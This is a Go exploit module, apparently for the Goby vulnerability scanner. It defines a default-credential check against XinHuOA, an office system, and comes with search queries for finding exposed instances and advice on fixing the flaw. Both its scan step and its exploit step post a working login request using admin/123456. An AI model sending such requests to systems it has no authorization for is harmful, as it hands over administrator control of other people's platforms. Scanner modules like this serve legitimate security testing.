package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "XinHuOA index.php Default Password vulnerability",
    "Description": "<p>Xincall OA is a free and open source office OA system.</p><p>The default password vulnerability of call OA is found. An attacker can use the default password admin/123456 to control the entire platform and operate core functions with administrator rights.</p>",
    "Product": "XinHuOA",
    "Homepage": "http://www.rockoa.com",
    "DisclosureDate": "2022-07-23",
    "Author": "橘先生",
    "FofaQuery": "(body=\"onclick=\\\"loginsubmit()\\\"\" && body=\"信呼开发团队\") || body=\"技术支持：<a href=\\\"http://www.rockoa.com/\\\"\"",
    "GobyQuery": "(body=\"onclick=\\\"loginsubmit()\\\"\" && body=\"信呼开发团队\") || body=\"技术支持：<a href=\\\"http://www.rockoa.com/\\\"\"",
    "Level": "1",
    "Impact": "<p>The default password vulnerability of call OA is found. An attacker can use the default password admin/123456 to control the entire platform and operate core functions with administrator rights.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [
        "http://www.rockoa.com/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php?a=check&m=login&d=&ajaxbool=true&rnd=300277",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
                    "Cookie": "PHPSESSID=9aag0fhgbdteanq8avmm8eb3q0; deviceid=1659707962697; xinhu_ca_adminuser=admin; xinhu_ca_rempass=0"
                },
                "data_type": "text",
                "data": "rempass=0&jmpass=false&device=1&ltype=0&adminuser=YWRtaW4%3A&adminpass=MTIzNDU2&yanzm="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "xinhu",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "success\":true,\"face",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|define|text|admin:123456"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php?a=check&m=login&d=&ajaxbool=true&rnd=300277",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
                    "Cookie": "PHPSESSID=9aag0fhgbdteanq8avmm8eb3q0; deviceid=1659707962697; xinhu_ca_adminuser=admin; xinhu_ca_rempass=0"
                },
                "data_type": "text",
                "data": "rempass=0&jmpass=false&device=1&ltype=0&adminuser=YWRtaW4%3A&adminpass=MTIzNDU2&yanzm="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "xinhu",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "success\":true,\"face",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|define|text|admin:123456"
            ]
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "7",
    "Translation": {
        "CN": {
            "Name": "信呼OA index.php 默认口令漏洞",
            "Product": "信呼OA",
            "Description": "<p><span style=\"color: rgb(41, 43, 44);\"></span><span style=\"color: rgb(41, 43, 44); font-size: 16px;\"><span style=\"color: rgb(36, 41, 47); font-size: 16px;\">信呼OA是一个免费开源的办公OA系统</span>。</span><br></p><p><span style=\"color: rgb(41, 43, 44);\"><span style=\"color: rgb(41, 43, 44);\"><span style=\"color: rgb(22, 28, 37); font-size: 16px;\"></span><span style=\"color: rgb(36, 41, 47); font-size: 16px;\">信呼OA</span>存在默认口令漏洞,攻击者使用默认口</span>令 admin/123456<span style=\"color: rgb(41, 43, 44);\">&nbsp;即可控制整个平台，使用管理员权限操作核心的功能。</span></span></p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p><span style=\"color: rgb(41, 43, 44); font-size: 16px;\"><span style=\"color: rgb(36, 41, 47);\">信呼OA</span>存在默认口令漏洞,攻击者使用默认口</span><span style=\"color: rgb(41, 43, 44); font-size: 16px;\">令 admin/123456</span><span style=\"color: rgb(41, 43, 44); font-size: 16px;\">&nbsp;即可控制整个平台，使用管理员权限操作核心的功能。</span><br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "XinHuOA index.php Default Password vulnerability",
            "Product": "XinHuOA",
            "Description": "<p>Xincall OA is a free and open source office OA system.</p><p>The default password vulnerability of call OA is found. An attacker can use the default password admin/123456 to control the entire platform and operate core functions with administrator rights.</p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">The default password vulnerability of call OA is found. An attacker can use the default password admin/123456 to control the entire platform and operate core functions with administrator rights.</span><br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10698"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
